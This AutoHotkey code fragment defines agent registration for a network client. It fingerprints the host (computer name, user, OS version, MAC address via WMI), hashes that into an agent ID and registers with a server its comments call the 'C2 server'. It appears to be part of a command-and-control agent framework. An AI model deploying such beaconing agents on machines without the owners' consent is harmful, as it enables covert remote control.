; ============================================================================
; NETWORK CLIENT - Registration Methods
; ============================================================================
; Methods for agent registration and identification
; These methods should be added to the NetworkClient class
; ============================================================================

; Generate a unique agent ID based on system information
GenerateAgentID() {
    systemInfo := this.GetSystemInfo()
    systemInfo .= A_ScriptFullPath
    return this.HashString(systemInfo)
}

; Collect system information for unique ID generation
GetSystemInfo() {
    info := A_ComputerName
    info .= A_UserName
    info .= A_OSVersion
    info .= this.GetMACAddress()
    return info
}

; Retrieve the first active MAC address
GetMACAddress() {
    try {
        objWMIService := ComObject("WbemScripting.SWbemLocator").ConnectServer(".", "root\CIMV2")
        colItems := objWMIService.ExecQuery("SELECT * FROM Win32_NetworkAdapterConfiguration WHERE IPEnabled = True")
        for objItem in colItems {
            return objItem.MACAddress
        }
    }
    return ""
}

; Simple hashing function for ID generation
HashString(str) {
    hash := 0
    loop parse str {
        hash := ((hash << 5) - hash) + Ord(A_LoopField)
        hash := hash & 0xFFFFFFFF
    }
    return Format("{:08x}", hash)
}

; Register with the C2 server (includes schema filename for auto-assignment)
Register() {
    this.Log("Attempting to register with server...")
    message := Format("register|{}|{}|{}", this.agentID, this.computerName, this.schema)

    try {
        response := this.SendMsg(this.serverIP, this.serverPort, message)
        if (InStr(response, "Registration successful")) {
            this.Log("Registration successful")
            return true
        } else {
            this.Log("Registration failed: " response)
            return false
        }
    } catch as err {
        this.Log("Registration error: " err.Message " occurred on line: " err.Line)
        return false
    }
}
